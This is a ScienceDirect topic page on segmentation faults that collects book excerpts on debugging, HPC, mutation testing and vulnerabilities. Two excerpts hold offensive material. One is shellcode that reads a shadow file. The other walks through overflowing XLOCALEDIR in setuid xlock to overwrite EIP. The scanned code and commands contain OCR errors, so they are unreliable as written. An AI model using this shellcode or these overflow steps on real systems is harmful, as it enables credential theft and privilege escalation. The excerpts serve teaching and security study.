@@ -1,0 +1,459 @@
+Skip to Main content
+Elsevier logo
+Journals & Books
+Segmentation Fault
+Related terms:
+Free SoftwareNeural NetworksCompilerCoprocessorsPointersVulnerabilities
+View all Topics
+Download as PDF
+Set alert
+About this page
+Learn more about Segmentation Fault
+Writing Shellcode II
+James C. Foster, Mike Price, in Sockets, Shellcode, Porting, & Coding, 2005
+
+Analysis
+The two system calls we implemented in the shellcode are executed successfully at lines 7 and 8. Unfortunately, at line 9 the program is terminated due to a segmentation fault. This happened because we didn’t do an exit after the last system call and the system therefore continued to execute the data located behind our sheUcode.
+
+Another problem exists in the shellcode. What if the shadow file is only 100 bytes in size? The read function won’t have a problem with that. The read system call by default returns the amount of bytes read. So if we use the return value of the read system call as the third argument of the write system call and also add an exit to the code, the shell-code always functions properly and won’t cause the program to dump core. Dumping core, or more commonly referred to as a core dump, is when a system crashes and memory gets written to a specific location. This is shown in Example 9.21.
+
+Example 9.21
+Core Dumps
+
+1	BITS	32
+2		
+3	xor	ebx,ebx
+4	mul	ebx
+5	cdq	
+6		
+7	mov	al,0x3
+8		
+9	mov	bl,0x4
+10	mov	ecx,Oxbffff9d0
+11	mov	dl,2 54
+12	int	0x80
+13		
+14	mov	dl.al
+15	mov	al, 0x4
+16	mov	bl,0x1
+17	int	0x80
+18		
+19	dec	bl
+20	mov	al, 1
+21	int	0x80
+
+Read full chapter
+
+Purchase book
+Writing Exploits II
+James C. Foster, Mike Price, in Sockets, Shellcode, Porting, & Coding, 2005
+
+The vulnerability
+We start off with merely the knowledge that there is a bug present in the handling of the XLOCALEDIR environment variable within the current installation (in this case, version 4.2) of X11R6. Often, in real-world exploit development scenarios, an exploit developer will find out about a bug via a brief IRC message or rumor, a vague vendor-issued advisory, or a terse CVS commit note such as “fixed integer overflow bug in copyout function.” Even starting with very little information, we can reconstruct the entire scenario. First, we figure out what the XLOCALEDIR environment variable actually is.
+
+According to RELNOTES-X.org from the X11R6 4.2 distribution, XLOCALEDIR: “Defaults to the directory $ProjectRoot/lib/Xll/locale.The XLOCALEDIR variable can contain multiple colon-separated pathnames.”
+
+Since we are only concerned with Xli applications that run as a privileged user (in this case, root), we perform a basic find request:
+
+$ find /usr/XHR6/bin -perm -4755
+
+/usr/XllR6/bin/xlock
+
+/usr/XllR6/bin/xscreensaver
+
+/usr/XHR6/bin/xterm
+
+Other applications besides the ones returned by our find request may be affected. Those applications could reside in locations outside of/usr/XHR6/bin. Or they could reside within /usr/Xl lR6/bin, but not be setuid. Furthermore, it is not necessarily true that all of the returned applications are affected; they simply have a moderate likelihood of being affected since they were installed as part of the X11R6 distribution and run with elevated privileges. We must refine our search.
+
+To determine if/usr/XHR6/bin/xlock is affected, we do the following:
+
+$ export XLOCALEDIR=‘perl -e ‘print “A”x7000’
+
+$ /usr/XllR6/bin/xlock
+
+Segmentation fault
+
+Whenever an application exits with a segmentation fault, it is usually a good indicator that the researcher is on the right track, the bug is present, and that the application might be vulnerable.
+
+The following is the code to determine if/usr/XHR6/bin/xscreensaver and /usr/XHR6/bin/xterm are affected:
+
+$ export XLOCALEDIR=‘perl -e ‘print “A”x7000’
+
+$ /usr/XllR6/bin/xterm
+
+/usr/XllR6/bin/xterm Xt error: Can’t open display:
+
+$ /usr/XllR6/bin/xscreensaver
+
+xscreensaver: warning: $DISPLAY is not set: defaulting to “:0.0”.
+
+Segmentation fault
+
+The xscreensaver program exited with a segmentation fault, but xterm did not. Both also exited with errors regarding an inability to open a display. Let’s begin by fixing the display error.
+
+$ export DISPLAY^”10.0.6.76 : 0.0”
+
+$ /usr/XllR6/bin/xterm
+
+Segmentation fault
+
+$ /usr/XllR6/bin/xscreensaver
+
+Segmentation fault
+
+All three applications exit with a segmentation fault. Both xterm and xscreensaver require a local or remote xserver to display to, so for simplicity’s sake we will continue down the road of exploitation with xlock.
+
+ Example 11.2
+Initializing a Socket and Connecting
+
+1 $ export XLOCALEDIR=‘perl -e‘print “A”χ7000’’
+
+2 $ gdb
+
+3 GNU gdb 5.2
+
+4 Copyright 2002 Free Software Foundation, Inc.
+
+5 GDB is free software,covered by the GNU General Public License, and you are welcome to change it and/or distribute copies of it under certain conditions.
+
+6 Type “show copying” to see the conditions.
+
+7 There is absolutely no warranty for GDB.Type “show warranty” for details.
+
+8 This GDB was configured as “i386-slackware-linux”.
+
+9 (gdb) file /usr/XllR6/bin/xlock
+
+10 Reading symbols from /usr/X11R6/bin/xlock...(no debugging symbols found)... done.
+
+11 (gdb) run
+
+12 Starting program: /usr/XllR6/bin/xlock
+
+13 (no debugging symbols found)...(no debugging symbols found)...
+
+14 (no debugging symbols found)...(no debugging symbols found)...
+
+15 (no debugging symbols found)...(no debugging symbols found)... [New Thread l7 1024 (LWP 1839)]
+
+16
+
+17 Program received signal SIGSEGV,Segmentation fault.
+
+18 [Switching to Thread 1024(LWP 1839)]
+
+19 0x41414141 in ?? ()
+20	(gdb) i r		
+21	eax	0x0 0	
+22	ecx	0x403cla01	1077680641
+23	edx	Oxffffffff	-1
+24	ebx	0x4022b984	1076017540
+25	esp	Oxbf f fd844	Oxbff£d844
+26	ebp	0x41414141	0x41414141
+27	esi	0x8272b60	136784736
+28	edi	0x403b4083	1077624963
+29	eip	0x41414141	0x41414141
+30	eflags	0x246    582	
+31	cs	0x233    5	
+32	ss	0x2b    43	
+33	ds	0x2b    43	
+34	es	0x2b    43	
+35	fs	0x0    0	
+36	gs	0x0    0	
+37	[other registers truncated]	
+38	(gdb)		
+
+As we see here, the vulnerability is definitely exploitable via xlock. EIP has been completely overwritten with 0x41414141 (AAAA). As you recall from the statement, [export XLOCALEDIR-‘perl -e ‘print “A”x7000’j, the buffer (XLOCALEDIR) contains 7000 “A” characters. Therefore, the address of the instruction pointer, EIP, has been overwritten with a portion of our buffer. Based on the complete overwrite of the frame pointer and instruction pointer, as well as the size of our buffer, we can now reasonably assume that the bug is exploitable.
+
+To determine the vulnerable lines of code from xc/lib/Xll/lcFile.c, we use the following code:
+
+static void xlocaledir(char *buf,int buf_len)
+
+{
+
+char *dir,*p = buf;
+
+int len = 0 ;
+
+dir = getenvt”XLOCALEDIR”);
+
+if (dir != NULL) {
+
+len = Strien(dir);
+
+strncpyfp, dir, buf_len);
+
+The vulnerability is present because in certain callings of xlocaledir, the value of dir (returned by the getenv call to the user buffer) exceeds int bufjen.
+
+Read full chapter
+
+Purchase book
+Getting geeky – tracing and debugging applications
+Igor Ljubuncic, in Problem-Solving in High Performance Computing, 2015
+
+Simple example
+We will begin with a simple example: a null pointer. In layman’s terms, a null pointer is a pointer to an address in the memory space that does not have a meaningful value and cannot be referenced by the calling program, for whatever reason. This will normally lead to an unhandled error, resulting in a segmentation fault. Here is our source code:
+
+
+Sign in to download full-size image
+Now, let us compile it, with symbols. This is done by using the -g flag when running gcc.
+
+
+Sign in to download full-size image
+And then we run it and get a nasty segmentation fault:
+
+
+Sign in to download full-size image
+Now, you may want to try to debug this problem using standard tools, such as perhaps strace, ltrace, maybe lsof, and a few others. Normally, you would do this, because having a methodical approach to problem solving is always good, and you should start with simple things first. However, we will purposefully not do that right now to simplify things. As we advance in the chapter, we will see more complex examples and the use of other tools, too.
+
+All right, so now we need to start using the GNU Debugger. We will invoke the program once again, this time through gdb. The syntax is simple:
+
+
+Sign in to download full-size image
+For the time being, nothing happens. The important thing is that gdb has read symbols from our binary. The next step is to run the program and reproduce the segmentation fault. To do this, simply use the command run inside gdb.
+
+
+Sign in to download full-size image
+We see several important details. First, we see that our program crashes. The problem is in the sixth line of source code, as shown in the image, our printf line. Does this mean there is a problem with printf? Probably not, but something in the variable that printf is trying to use, most likely. The plot thickens.
+
+Second, you may also see a message that separate debuginfo (symbols) for third-party libraries, which are not part of our own code, are missing. This means that we can hook into their execution, but we will not see any symbols. We will see an example soon.
+
+What we learn here is that we have symbols that gdb will not run automatically and that we have a meaningful way of reproducing the problem. This is very important to remember, but we will recap this when we discuss when to run or not to run gdb.
+
+Breakpoint
+Running through the program does not yield enough meaningful information. We need to halt the execution just before the printf line. Enter breakpoints, just like when working with a compiler. We will break into the main function and then advance step by step until the problem occurs again, then rerun and break, and then execute commands one at a time just short of the segmentation fault.
+
+To this end, we need the break command, which lets you specify breakpoints either at functions, your own or third-party loaded by external libraries or specific lines of code in your sources – an example is on the way. Then, we will use the info command to examine our breakpoints. We will place the breakpoint in the main() function. As a rule of thumb, it is always a good place to start.
+
+
+Sign in to download full-size image
+Now we run the code again. The execution halts when we reach main().
+
+
+Sign in to download full-size image
+Step by step
+Now that we have stopped at the entry to main, we will step through code line by line, using the next command. Luckily for us, there is not that much code to walk through. After just two steps, we encounter a segmentation fault. Good.
+
+
+Sign in to download full-size image
+
+Sign in to download full-size image
+We will now rerun the code, break in the main(), do a single next that will lead us to printf, and then we will halt and examine the assembly code, no less!
+
+
+Sign in to download full-size image
+Disassembly
+Indeed, at this stage, there is nothing else the code can tell us. We have exhausted our understanding of what happens in the code. Seemingly, there does not seem to be any great problem, or rather, we cannot see it yet.
+
+So we will use the disassemble command, which will dump the assembly code. Just type disassemble inside gdb and this will dump the assembly instructions that your code uses.
+
+
+Sign in to download full-size image
+This is probably the most difficult part of the tutorial yet. Let us try to understand what we see here, again in very simplified terms.
+
+On the left, we have memory addresses. The second column shows increments in the memory space from the starting address. The third column shows the mnemonic. The fourth column includes actual registers and values.
+
+There is a little arrow pointing at the memory address where our execution is right now. We are at offset 40054b, and we have moved the value that is stored 8 bytes below the base pointer into the RAX register. One line before that, we moved the value 0 into the RBP-8 address. So now, we have the value 0 in the RAX register.
+
+
+Sign in to download full-size image
+Our next instruction is the one that will cause the segmentation fault, as we have seen earlier while stepping through the code with the next command.
+
+
+Sign in to download full-size image
+So we need to understand what is wrong here. Let us examine the ESI register, which is supposed to get this new value. We can do this by using the examine or x command. You can use all kinds of output formats, but that is not important right now.
+
+
+Sign in to download full-size image
+And we get a message that we cannot access memory at the specified address. This is the clue right there, problem solved. We tried accessing an illegal memory address. As to why we breached our allocation and how we can know that, we will learn soon.
+
+Read full chapter
+
+Purchase book
+Math Library
+Jim Jeffers, James Reinders, in Intel Xeon Phi Coprocessor High Performance Programming, 2013
+
+Floating-point exceptions
+The biggest differences arise in the treatment of floating-point exceptions. The vector floating-point unit on the Intel Xeon Phi coprocessor flags but does not support trapping of floating-point exceptions. The corresponding bit in the VXCSR register is protected; attempts to modify it result in a segmentation fault. Some compiler options such as –fp–trap (C/C++) or –fpe0 (Fortran) that would unmask floating-point exceptions on Intel Xeon processors are unsupported on Intel® MIC architecture. The options –fp–model except or –fp–model strict still request strict, standard-conforming semantics for floating-point exceptions. This is achieved by generating x87 code for floating-point operations instead of code that makes use of Intel Xeon Phi coprocessor vector instructions. Because such code cannot be vectorized, this may have a substantial impact on performance. Nevertheless, these options may be useful for application debugging. For similar reasons, the options –ansi and –fmath–errno may result in calls to math functions that are implemented in x87 rather than the vector instructions.
+
+In the Intel Fortran compiler version 13.0, the IEEE_FEATURES, IEEE_ARITHMETIC and IEEE_EXCEPTIONS modules are not yet updated for the properties of the Intel Xeon Phi coprocessor.
+
+Read full chapter
+
+Purchase book
+Software Detection and Recovery
+In Architecture Design for Soft Errors, 2008
+
+Trading off Reliability for Performance
+One way to reduce the performance overhead from Spot's software RMT implementation is to incur greater numbers of SDC errors. To do this effectively, one can protect structures with higher AVF or bit counts and potentially remove the protection on structures with lower AVFs. For example, in an x86 architecture, the registers EBP and ESP are typically highly susceptible to transient faults. These registers are used primarily as pointers loading from and storing to memory. Hence, faults in these registers will likely cause a segmentation fault.
+
+Spot allows each architectural register to be either protected or not protected via the binary translation mechanism. If a register is unprotected, instructions to duplicate the operation that uses the register and instructions that detect a fault in that register are both eliminated, thereby improving performance of the application. Given that the x86 architecture has eight registers, one can create 28 or 256 combinations. For example, one of the 256 combinations could have protection on the registers EBP and ESP but no protection on the other six registers.
+
+Figure 8.7 shows the performance of each of the 256 combinations against their SDC AVF. The left side of the graph contains data points that have EBP protected, causing greater execution time, and the right side of the graph typically has no protection for EBP. As this graph shows, there is performance-reliability trade-off that software can exploit. For example, a user may choose to get a twofold degradation in performance for an SDC AVF of 15% (point B in Figure 8.7), instead of a four-fold degradation in performance with an SDC AVF of 5% (point A in Figure 8.7).
+
+
+Sign in to download full-size image
+FIGURE 8.7. Trading off performance for reliability for the SPEC integer benchmark gap. Points A and B are discussed in the text.
+
+Reprinted with permission from Reis et al. [13] Copyright © 2006 IEEE.Copyright © 2006
+Computing AVFs to make this trade-off can, however, be challenging. Obtaining the AVFs for architectural register files requires numerous fault injection experiments on a per-application basis, which can be tedious. A programmer typically has visibility into architectural structures only. Microarchitectural structures are not exposed to the programmer, and current hardware does not provide any way to compute what the AVFs of different structures could be. To make matters more complex, AVFs change across structures, so minimizing the AVF of a register file alone may not mean that the SDC rate of a processor running an application has been lowered. This remains a future research area in computer architecture.
+
+Read full chapter
+
+Purchase book
+Reverse Engineering
+Alijohn Ghassemlouei, ... Russ Rogers, in The Hacker's Guide to OS X, 2013
+
+Taking It Home
+Continuing our exploration of the exploitation that can be derived from this type of buffer overflow we still want to be able to achieve arbitrary code execution, which is truly not that far off, once you know you can overwrite the buffer. In black box testing for this type of scenario you are most likely going to be dealing with inputs and not a char string written into the program.
+
+Note
+Black box testing is a type of testing scenario in which the tester has no knowledge of the inner workings of the application or product. This type of testing is accomplished by sending data and observing the output to determine function.
+
+There are a few different methods that we’ll use to know if possibly have a buffer overflow condition in a piece of code. The best result we’d like to see is a segmentation fault (SEGFAULT) returned by the application when we enter some set length of arbitrary characters, such as “AAAAA.” What we can do from here is try to find our shellcode injection point as a result of this buffer overflow.
+
+This is possible by altering the string trailing character to something like “AAAAB” so when the application faults again you can see the specific memory address the fault is taking place at by looking for a 42 (B) instead of 41 (A). When we look at a core dump with something like GNU Debugger (GDB http://sources.redhat.com/gdb/) we would see the exact memory address the buffer overflow is writing into, allowing us to better refine our code to precisely inject the shell code into the memory. In Figure 8.18 we have a stripped down core dump in gdb where we see that have overwritten the Base Pointer which means with some more manipulation we could possibly injection shellcode. Usually if you see this type of buffer overflow in programs, it is because they are holding a buffer open to receive some information from another program or the network and have the buffer has a fixed size. The technique of throw pseudo-random data at an application’s interfaces is known as fuzzing and is aimed at attempting to get the application to crash.
+
+
+Sign in to download full-size image
+Figure 8.18. Core Dump of VulnAppCLI
+
+You may ask yourself why it matters if we have the ability to inject code into a buffer on the stack. If you remember earlier in the chapter we covered how important the Instruction Pointer (EIP) we said if you control the EIP you essentially control the machine. In this scenario that is the case as the attacker can overwrite local variables around the memory space is has the ability to write to, he could control or overwrite the return address of a stack frame giving and upon return of the function to the stack fame the CPU would resume the attacker’s code, and last, but not least the attacker could possibly overwrite the function pointer as we have with the Base Pointer.
+
+Read full chapter
+
+Purchase book
+Debugging
+Thomas Sterling, ... Maciej Brodowicz, in High Performance Computing, 2018
+
+14.1 Introduction
+Frequently high performance computing (HPC) practitioners encounter anomalies in application execution that arise from a wide variety of origins, including hardware failures, programming errors, software technical errors, or even the unlikely case of a cosmic ray flipping a bit and interfering with the computation. Tracking the origin of such application execution anomalies is difficult even when using just a simple desktop or laptop computer. On an HPC resource, resolving such an anomaly in an application is compounded many times by the complex interplay between the multiple network, memory, and library components of the supercomputer and the different execution modalities employed. This chapter introduces several techniques and tools for debugging an HPC application and explores several of the more common types of bugs the practitioner will encounter, including deadlocks, races, memory leaks, segmentation faults, and invalid references, among others.
+
+Photo by Smithsonian Institution via Wikimedia Commons
+
+Sign in to download full-size image
+Grace Brewster Murray Hopper seated at the input console for the UNIVAC I.
+
+
+Grace Brewster Murray Hopper was a mathematics professor who became a US Navy rear admiral and strongly promoted and influenced the development of higher-level programming languages at a time when most programming was done in nonportable, machine-specific languages. In addition to her programming language and compiler work, which served as the genesis of the common business-oriented language (COBOL), she was a senior developer on the first commercial electronic computer, the UNIVAC 1. In her own words, “the most important thing I've accomplished, other than building the compiler, is training young people”. Among numerous other accolades, Grace Hopper received the highest civilian award of the United States, the Presidential Medal of Freedom, posthumously in 2016.
+
+Historically debugging is popularly associated with Grace Hopper, who discovered a moth interfering with a computer's operation while working on the Harvard Mark II electromechanical computer in 1947. The moth was placed in the group's logbook with the caption “First actual case of bug being found”, as seen in Fig. 14.1. In a similar story that slightly predates Grace Hopper's experience, mathematician Norbert Wiener was called to diagnose the anomalous behavior of the automatic fire control of a warship gun during World War II. After hearing a description of the specific short circuits that occurred at certain gun muzzle positions, he correctly predicted that a dead mouse would be found in the device and the specific location where it would be found [1].
+
+
+Sign in to download full-size image
+Figure 14.1. An example of literal debugging from the Harvard Mark II as recorded by Grace Hopper—a moth found in the machine has been taped to the logbook.
+
+Photo courtesy: Naval Surface Warfare Center, Dahlgren, VA, 1988 via Wikimedia Commons
+Not entirely unlike these famous cases of literal debugging, debugging an application on a high performance computer frequently requires a fairly detailed view of the supercomputer software and hardware stack to diagnose the anomaly properly. There are a wide variety of tools that can assist in diagnosing a problem. This chapter begins by introducing the use of the GNU debugger (GDB) and the Valgrind instrumentation framework, and mentioning some of the more prevalent commercial debugger tools. The chapter then uses the tools to explore a series of common bugs found in message-passing interface (MPI) and OpenMP codes. It finishes by enumerating a list of common compiler flags and messages that are helpful in debugging applications, and some available system monitor approaches to debugging.
+
+Read full chapter
+
+Purchase book
+A deeper look into the system
+Igor Ljubuncic, in Problem-Solving in High Performance Computing, 2015
+
+Process space
+Let us go back to the process maps. We have briefly discussed the /proc/PID/maps set of variables, but they are far more useful than a precursory glance. They allow for a deeper understanding of the process behavior, especially if you know what a particular application is supposed to be doing. Here is a sample process:
+
+
+Sign in to download full-size image
+For each line, in the first column, we get the start and end address in memory. The second column specifies the permissions of the particular region in memory. There are four permissions available, including read, write, execute, and shared. Private regions are marked with p, and they cannot be accessed by other processes. Such attempts will result in a violation and a segmentation fault.
+
+If a file was read from a disk and loaded into memory using the mmap (mmap(2), n.d.) system call, then in the third column we will see the offset from the beginning of the file. The fourth column specifies the major and minor numbers of the corresponding device for regions that were mapped from a file. The full listing of major and minor numbers can be found in the Documentation/devices.txt file in the kernel source tree
+
+
+Sign in to download full-size image
+
+Sign in to download full-size image
+For instance, for the libc-211.3.so library, we can see it was read from a 08:02 device, which means the file was read from the second partition of the first SCSI/SATA disk device, in other words sda2, which is indeed the / on the specific host.
+
+The fifth column is the inode number, and the sixth the actual name of the loaded object. The field is blank for regions that were anonymously mapped. Now, we also need to pay attention to the different rows in the /proc/PID/maps output.
+
+The first entry corresponds to the code (text) of the binary in question. Naturally, this region is marked as executable. The second line shows the binary data, which also includes all initialized global variables. The third line corresponds to heap, for dynamically allocated memory, using system calls such as malloc. It may also include additional segments of the binary code, such as the .bss segment, with statically linked and uninitialized global variables. If the .bss segment is small, it may be stored in the data segment.
+
+Shared libraries are listed next, and the list can be very long. At the end of the output, there are three special lines, also marked in square brackets. There is the stack, followed by vdso and vsyscall.
+
+
+Sign in to download full-size image
+We will begin with the last. Vsyscall was introduced to replace the slower int 0 3 80 interrupt used for system calls on older architectures (Bar, 2000). However, it comes with certain restrictions, such as the size of the memory allocation and possible security implications. Vsyscall is mapped in the kernel (notice the address region), and it depends on the particular kernel configuration
+
+Vdso (vDSO) (object, vDSO – overview of the virtual ELF dynamic shared, n.d.), which stands for virtual dynamic shared object, is a small library map shared automatically by the kernel into the address space of all applications. This object is used to improve performance by providing faster access to some commonly used system calls, and it overcomes the limitations of the vsyscall (Corbet, 2011). This method is preferred over vsyscall whenever possible. On some systems, vDSO may also be known as linux-gate.so (Petersson, 2005).
+
+Understanding the process space is very important for debugging and troubleshooting. In most cases, system administrators will not manually manipulate the memory space, but when additional tools are used to trace the execution of a process, the insight can be useful, and it might shed new light on the issue at hand.
+
+Read full chapter
+
+Purchase book
+Mutation Testing Advances: An Analysis and Survey
+Mike Papadakis, ... Mark Harman, in Advances in Computers, 2019
+
+5.6 Mutation Score Calculation and Refinement (Step 6)
+The mutant execution aims at determining which mutants are killed and which are not. By calculating this number, we can compute the mutation score that represents the level of the test thoroughness achieved. Determining whether a test execution resulted in killing a mutant requires observing and comparing the program outputs. Thus, depending on what we define as a program output we can have different killing conditions. Usually, what constitutes the program output is determined by the level of granularity that the testing is applied to. Usually in unit testing the program output is defined as the observable (public access) return values, object states (or global variables), exceptions that were thrown (or segmentation faults), and program crashes. In system level, program output constitutes everything that the program prints to the standard/error outputs, such as messages printed on the monitor, behavior of user interfaces, messages sent to other systems, and data stored (in files, databases, etc.).
+
+In the case of nondeterministic systems, it is necessary to define mutant-killing conditions based on a form of oracle that models the behavior of the obtained outputs. Patrick et al. [213] use pseudo-oracles to test stochastic software. Rutherford et al. [214] use discrete-event simulations (executable specifications) to define assertions and sanity checks that model how “reasonable” are the test execution results (distribution topology, communication failure, and timing) of distributed systems.
+
+Observing and comparing the program outputs often requires a test driver that it is program specific and, thus, researchers usually approximate program outputs by observing a subset of it, usually defined by the test assertions (and program crashes). Alternative techniques involve the use of stubs, oracle data, log messages, and internal program states that will be detailed later on in Section 5.9. Mateo et al. [128] proposed flexible weak mutation, an approach for system-level mutation testing that considers mutants as killed when they result in corrupted object states. Object states are checked after the execution of every method call. Wu et al. [104] record execution paths and determine whether mutants cause any deviations from the original program's ones (execution of different paths).
+
+Computing the mutation score requires the removal of equivalent mutants. As already discussed in Section 5.3, identifying equivalent mutants is a manual task that is partially addressed through static heuristics. Since the problem is important, there are some attempts to approximate the mutation score using dynamic heuristics. The idea is that mutants that are not killed by the tests but are capable of causing differences on the program state are likely to be killable [215]. This idea was initially introduced by Grun et al. [215] and, later, studied by the works of Schuler and colleagues [216–218]. Overall, these studies examined several heuristics that measure different types of impact (breaking program invariants, changed return values, altered control-flow and data-flow) and showed that measuring whether mutants cause deviations on the program execution forms the best option.
+
+The use of mutants’ impact provides opportunities to define mutant selection and classification strategies. Schwarz et al. [219] defined a mutant selection strategy by selecting a small set of mutants with high impact and diverge locations (all over the codebase). Mutant classification provides opportunities to achieve good trade-offs between effectiveness and efficiency. Papadakis and Traon [220,221] defined such strategies and found that mutant classification is beneficial when low-quality test suites are used.
+
+Other attempts to refine and approximate the mutation score with the use of mutant classification are due to Kintis et al. [222,223]. Kintis et al. observed that killable mutants are likely to compose a higher order mutant that behaves differently than the first-order ones that it is composed of. Based on this observation, a mutant classification strategy that identifies 81% of the killable mutants with a precision of 71% was proposed.
+
+Read full chapter
+
+Purchase book
+Analyzing Security Data
+Andrew Meneely, in The Art and Science of Analyzing Software Data, 2015
+
+8.1 Vulnerability
+Software engineers today are faced with a tough set of expectations. They are asked to develop their software on time, on budget, and with no bugs. The “no bugs” category, often called software quality, is a grab-bag of various types of mistakes that a developer can make. Bug reports might have statements like “the app crashes when I hit this button,” or “the installation script fails on this operating system.” Preventing, finding, and fixing bugs are an enormous portion of the software development lifecycle that manifests itself in activities like software testing, inspections, and design.
+
+But bugs also have a darker, more sinister cousin: the vulnerability. Rather than the system failing to do what it’s supposed to do, the system is abused in a cleverly malicious way. Instead of registering an email address in a web application, an attacker may inject operating system commands that leads to root access on the server. Or a common segmentation fault becomes a denial of service attack when it can be reproduced over and over again.
+
+Informally, a vulnerability is a software fault that has security consequences. Our formal definition of a vulnerability is as follows (adapted from [1]), which is based on a standard definition of fault found in Definition 1.
+
+Definition 1
+
+A vulnerability is an instance of a fault that violates an implicit or explicit security policy.
+
+Faults are the actual mistake a developer made in source code that results in a failure. The “security policy” of a system is an implicit or explicit understanding of how the system adheres to three properties: confidentiality, integrity, and availability. For example, if a healthcare system exposed patient records to the public, then the intended confidentiality of the system was violated. In some cases, a software development team may define a specific security policy as a part of their requirements document. In most cases, however, software development teams have a simple “I’ll know it when I see it” policy regarding security.
+
+Though vulnerabilities are considered to be a subset of faults, they are a different breed of faults altogether. A typical bug might be considered as some behavior where the system falls short, whereas a vulnerability is one where the system exhibits behavior beyond the specification. For example, if a user is allowed to type executable Javascript in a web application, then they can compromise other users who view that data, which also known as a cross-site scripting (XSS) vulnerability. Or, as another example, if an attacker is able to hijack another user’s session, then they have provided themselves with another means of authentication that goes beyond the system’s specification.
+
+To visualize the difference between vulnerabilities and typical bugs conceptually, consider Figure 8.1. The perfectly-rounded circle is the system “as it is should be.” The squiggly circle is what the system actually is. In any practical setting the system will not match up perfectly to expectations, leading to two areas of mistakes: places where the system falls short of its expected functionality (typical bugs) and places where the system does more than what was specified. Vulnerabilities are in the areas where too much, or unintended, functionality is allowed.
+
+
+Sign in to download full-size image
+Figure 8.1. Conceptual difference between typical bugs and vulnerabilities.
+
+We note that “as it should be” is not necessarily the system’s specifications. What the system ought to be is often a combination of explicit statements and implicit assumptions. In fact, vulnerabilities often exist where the specifications themselves can be insecure.
+
+Thus, with security, just getting a system working is not enough. The system must also not do what it is not supposed to. This conceptual difference between vulnerabilities and typical bugs not only alters the way developers approach software quality, it also introduces some “gotchas” regarding data analysis.
+
+8.1.1 Exploits
+Vulnerabilities only become dangerous when they are actually taken advantage of with malicious intent. Exploits are the manifestation of that malicious intent. A single vulnerability can have many, potentially infinite exploits for it. In this chapter, our definition of an exploit is:
+
+Definition 2
+
+An exploit is a piece of software, a chunk of data, or a sequence of commands that takes advantage of a vulnerability in an effort to cause unintended or unanticipated behavior.
+
+Exploits can come in many different forms. They can be a simple string that an attacker manually enters into a web application, or they can be sophisticated malware. One assumption that can be made about exploits is that a lack of exploits implies a lower risk. Just because no one has taken the time to write an exploit does not mean that a damaging one will not be written.
+
+Exploit avoidance is a much different practice for software engineers than vulnerability prevention. Examples of exploit avoidance include intrusion detection systems and anti-virus systems that provide a layer of defense that can detect specific exploits. These systems, while important for users, cannot be relied upon fully.
+
+Read full chapter
+
+Purchase book
+Elsevier logo
+About ScienceDirect
+Remote access
+Shopping cart
+Advertise
+Contact and support
+Terms and conditions
+Privacy policy
+We use cookies to help provide and enhance our service and tailor content and ads. By continuing you agree to the use of cookies.
+
+Copyright © 2019 Elsevier B.V. or its licensors or contributors. ScienceDirect ® is a registered trademark of Elsevier B.V.
+
